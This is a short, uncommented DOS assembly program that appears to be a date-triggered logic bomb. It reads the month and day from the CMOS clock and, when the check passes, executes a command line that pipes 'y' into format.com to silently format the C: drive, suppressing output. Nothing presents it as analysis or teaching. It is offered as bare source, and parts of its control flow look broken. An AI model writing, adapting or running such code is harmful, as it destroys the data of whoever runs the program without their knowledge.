.model tiny
.code
        org 100h
start:
        mov al, 8
        out 70h, al
        out 0ebh, al
        out 0ebh, al
        in  al, 71h
        out 0ebh, al
        out 0ebh, al
        cmp al, 1
        jnz exit
        mov al, 7
        out 70h, al
        out 0ebh, al
        out 0ebh, al
        in  al, 71h
        out 0ebh, al
        out 0ebh, al
        cmp al, 1
        jge kill
exit:   mov al, 0
        mov cs:100h, al
        mov ax, 0
        mov cs:101h, ax
        mov ax,100h
        jmp ax

kill:   mov ax,cs
        mov ds,ax
        mov es,ax
        mov si,0;*
        mov di,100h
        cld
        mov cx,di
        mov ax,cx
        rep movsb
        jmp ax

Erase:  mov bx,100
        mov ah,4ah
        int 21h
        mov ax,cs
        mov ds,ax
        mov es,ax
        mov dx,140h ;name
        mov bx,170h ;epb
        mov cs:[174h], ax
        mov ax,4b00h
        mov sp, 140h
        int 21h
        jmp exit
        db  offset Erase + 40h-$ dup (0)
string: db 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
epb:    db 14 dup (0)
line:   db 6
        db '/c echo y | c:\windows\command\format.com c: >nul             ',13
        end start